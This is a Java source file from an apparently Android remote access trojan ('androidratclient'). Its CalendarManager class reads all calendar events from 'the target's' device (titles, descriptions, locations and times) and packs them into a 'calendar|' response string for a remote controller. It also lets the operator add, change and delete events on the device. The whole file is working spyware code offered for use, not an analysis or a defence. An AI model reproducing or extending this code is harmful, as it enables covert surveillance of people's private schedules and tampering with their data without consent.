package com.dev.ah10.androidratclient;

        import android.content.ContentResolver;
        import android.content.ContentUris;
        import android.content.ContentValues;
        import android.content.Context;
        import android.database.Cursor;
        import android.net.Uri;
        import android.provider.CalendarContract;
        import android.util.Log;
        import java.util.TimeZone;

class CalendarManager //Class to interact with the target's calendar
{
    private Context ctx; //The context to use

    CalendarManager(Context appContext) //Constructor
    {
        ctx = appContext; //Set the context to use
    }

    private int getCalendarID() //Get the first calendar's ID
    {
        try
        {
            ContentResolver cr = ctx.getContentResolver(); //Get a content resolver
            Cursor cur = cr.query(
                    CalendarContract.Events.CONTENT_URI, //Query the Events Table
                    null,
                    null,
                    null,
                    null
            );

            if (cur != null && cur.getCount() > 0) //If can query, at least 1 row available
            {

                cur.moveToFirst(); //Move to the first row
                Integer result = Integer.parseInt(
                        cur.getString(cur.getColumnIndex(CalendarContract.Events.CALENDAR_ID))
                ); //Get the calendar id of the first event in the Table

                cur.close(); //Close the query

                return result; //Return the calendar ID
            }
            else
            {
                return -1; //If can't query return -1
            }
        }
        catch (SecurityException ex) //If permission prompt is cancelled at the start of the app
        {
            Log.e("CalendarManager", "Failed to get calendar ID: " + ex.toString());
            return -1;
        }
    }

    String getCalendarEvents() //List the calendar events
    {
        try
        {
            ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
            StringBuilder sb = new StringBuilder();
            sb.append("calendar|"); //Response Command
            Cursor cur = cr.query(
                    CalendarContract.Events.CONTENT_URI, //Query the events table
                    null,
                    null,
                    null,
                    null
            );

            if (cur != null && cur.getCount() > 0) //If can query, at least 1 row
            {
                while (cur.moveToNext()) //Move to the next row
                {
                    //Retrieve the event's data
                    String eventName = cur.getString(cur.getColumnIndex(CalendarContract.Events.TITLE));
                    String eventLocation = cur.getString(cur.getColumnIndex(CalendarContract.Events.EVENT_LOCATION));
                    String eventDescription = cur.getString(cur.getColumnIndex(CalendarContract.Events.DESCRIPTION));
                    String eventID = cur.getString(cur.getColumnIndex(CalendarContract.Events._ID));
                    String eventStrStartTime = cur.getString(cur.getColumnIndex(CalendarContract.Events.DTSTART));
                    String eventStrEndTime = cur.getString(cur.getColumnIndex(CalendarContract.Events.DTEND));

                    //Store the event's data
                    sb.append(eventName).append(";")
                            .append(eventDescription).append(";")
                            .append(eventLocation).append(";")
                            .append(eventID).append(";")
                            .append(eventStrStartTime).append(";")
                            .append(eventStrEndTime).append("|");
                }

                cur.close(); //Close the query
            }
            else
            {
                Log.e("CalendarManager", "Calendar is empty or failed to load database");
                return "calendar|failed";
            }

            String result = sb.toString();
            result = result.substring(0, result.length() - 1); //Cut the last separator char

            return result; //return the events
        }
        catch (SecurityException ex) //Permission prompt cancelled at the start of the app
        {
            Log.e("CalendarManager", "Failed to load events: " + ex.toString());
            return "calendar|failed";
        }
    }

    void addCalendarEvent(String name, String desc, String loc, Long start, Long end) //Add a new event to the calendar
    {
        try
        {
            int targetCalendar = getCalendarID(); //Get the calendar ID
            if (targetCalendar == -1) return; //If failed to get it return
            if (start == 0 || end == 0) return; //If no time specified return

            ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
            ContentValues values = new ContentValues(); //Create the content values

            //Add the content values
            if (!name.equals("")) values.put(CalendarContract.Events.TITLE, name); //Add name
            if (!desc.equals("")) values.put(CalendarContract.Events.DESCRIPTION, desc); //Add description
            if (!loc.equals("")) values.put(CalendarContract.Events.EVENT_LOCATION, loc); //Add location
            values.put(CalendarContract.Events.DTSTART, start); //Add start time
            values.put(CalendarContract.Events.DTEND, end); //Add end time
            values.put(CalendarContract.Events.CALENDAR_ID, targetCalendar); //Reference the calendarID
            values.put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().toString()); //Add the default time zone
            //Insert the values to the DB
            cr.insert(CalendarContract.Events.CONTENT_URI, values);
        }
        catch (SecurityException ex) //Permission prompt cancelled at the start of the app
        {
            Log.e("CalendarManager", "Failed to add event to calendar: " + ex.toString());
        }
    }

    void updateCalendarEvent(String eventID, String name, String desc, String loc, Long start, Long end) //Modify an event
    {
        ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
        ContentValues values = new ContentValues(); //Create content values
        Integer id = Integer.parseInt(eventID); //Parse the target event's ID

        //Add the content values
        if (!name.equals("")) values.put(CalendarContract.Events.TITLE, name); //Add name
        if (!desc.equals("")) values.put(CalendarContract.Events.DESCRIPTION, desc); //Add description
        if (!loc.equals("")) values.put(CalendarContract.Events.EVENT_LOCATION, loc); //Add location
        if (start != 0) values.put(CalendarContract.Events.DTSTART, start); //Add start time
        if (end != 0) values.put(CalendarContract.Events.DTEND, end); //Add end time

        Uri updateUri = ContentUris.withAppendedId(CalendarContract.Events.CONTENT_URI, id); //Get an update URI (uri of the original event)
        cr.update(updateUri, values, null, null); //Place the values to the updateUri
    }

    void deleteCalendarEvent(String eventID) //Remove an event from the calendar
    {
        ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
        Integer id = Integer.parseInt(eventID); //Parse the event's ID
        Uri deleteUri = ContentUris.withAppendedId(CalendarContract.Events.CONTENT_URI, id); //Get the URI of the event
        cr.delete(deleteUri, null, null); //Delete the event
    }
}
